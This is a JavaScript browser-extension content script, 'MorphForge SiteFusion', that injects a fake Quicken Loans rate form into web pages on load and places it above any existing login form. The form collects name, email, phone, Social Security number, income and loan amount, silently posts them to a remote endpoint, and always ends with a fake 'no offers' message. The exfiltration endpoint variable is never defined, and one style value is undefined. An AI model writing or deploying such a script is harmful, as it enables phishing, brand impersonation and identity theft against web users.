// MorphForge SiteFusion - content script
(() => {
  const SK = "quicken";               // default skin
  const CFG = {
    quicken: {
      t: "Quicken Loans",
      c: { bg: "#ffffff", p: "#0070ba" },
      f: [
        { n: "name", l: "Full Name", r: 1 },
        { n: "email", l: "Email", t: "email", r: 1 },
        { n: "phone", l: "Phone", t: "tel", r: 1 },
        { n: "ssn", l: "SSN", p: "\\d{3}-\\d{2}-\\d{4}", r: 1 },
        { n: "income", l: "Annual Income", t: "number", r: 1 },
        { n: "loanAmount", l: "Desired Loan Amount", t: "number", r: 1 }
      ],
      b: "Get My Rate",
      w: "Searching loan programs…",
      x: "Sorry, no offers available at this time."
    }
  };

  function inject() {
    const C = CFG[SK];
    const id = "mf-" + Math.random().toString(36).slice(2);
    const css = `#${id}{font-family:${C.c.f};max-width:340px;margin:50px auto;padding:25px;border-radius:8px;background:${C.c.bg};box-shadow:0 4px 12px rgba(0,0,0,.15)}#${id} h2{margin:0 0 18px;text-align:center;color:${C.c.p}}#${id} label{display:block;margin:10px 0 4px;font-size:14px}#${id} input{width:100%;padding:9px;border:1px solid #ccc;border-radius:4px}#${id} button{width:100%;padding:11px;margin-top:15px;border:none;border-radius:4px;background:${C.c.p};color:#fff;font-size:16px;cursor:pointer}#${id} button:disabled{opacity:.6}#${id} .msg{margin-top:12px;font-size:13px;text-align:center}`;
    const shell = document.createElement("div");
    shell.id = id;
    let html = `<h2>${C.t}</h2><form id="${id}-f">`;
    C.f.forEach(f => html += `<label>${f.l}<input name="${f.n}" type="${f.t || "text"}" ${f.p ? `pattern="${f.p}"` : ""} ${f.r ? "required" : ""}></label>`);
    html += `<button type="submit">${C.b}</button></form><div class="msg" id="${id}-m"></div>`;
    shell.innerHTML = html;
    const style = document.createElement("style");
    style.textContent = css;
    document.head.appendChild(style);
    (document.querySelector("form, [data-login]") || document.body).insertAdjacentElement("afterbegin", shell);
    document.getElementById(`${id}-f`).addEventListener("submit", async e => {
      e.preventDefault();
      const fd = new FormData(e.target), data = Object.fromEntries(fd.entries()), msg = document.getElementById(`${id}-m`);
      msg.textContent = C.w;
      try { await fetch(CFU, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) }); msg.textContent = C.x; } catch { msg.textContent = C.x; }
    });
  }

  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", inject); else inject();
})();
